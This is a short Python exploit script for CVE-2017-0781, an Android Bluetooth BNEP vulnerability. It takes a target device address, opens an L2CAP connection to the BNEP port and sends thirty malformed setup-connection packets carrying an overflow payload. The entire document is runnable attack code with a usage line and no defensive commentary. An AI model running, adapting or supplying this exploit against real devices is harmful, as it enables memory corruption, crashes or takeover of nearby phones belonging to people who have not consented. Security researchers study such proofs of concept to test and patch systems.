from pwn import *
import bluetooth

if not 'TARGET' in args:
    log.info('Usage: python CVE-2017-0781.py TARGET=XX:XX:XX:XX:XX:XX')
    exit()

target = args['TARGET']

count = 30 # Amount of packets to send

port = 0xf # BT_PSM_BNEP
context.arch = 'arm'
BNEP_FRAME_CONTROL = 0x01
BNEP_SETUP_CONNECTION_REQUEST_MSG = 0x01

def set_bnep_header_extension_bit(bnep_header_type):
    """
    If the extension flag is equal to 0x1 then
    one or more extension headers follows the BNEP
    header; If extension flag is equal to 0x0 then the
    BNEP payload follows the BNEP header.
    """
    return bnep_header_type | 128

def bnep_control_packet(control_type, control_packet):
    return p8(control_type) + control_packet

def packet(overflow):
    pkt = ''
    pkt += p8(set_bnep_header_extension_bit(BNEP_FRAME_CONTROL))
    pkt += bnep_control_packet(BNEP_SETUP_CONNECTION_REQUEST_MSG, '\x00' + overflow)
    return pkt

bad_packet = packet('AAAABBBB')

log.info('Connecting...')
sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
bluetooth.set_l2cap_mtu(sock, 1500)
sock.connect((target, port))

log.info('Sending BNEP packets...')
for i in range(count):
    sock.send(bad_packet)

log.success('Done.')
sock.close()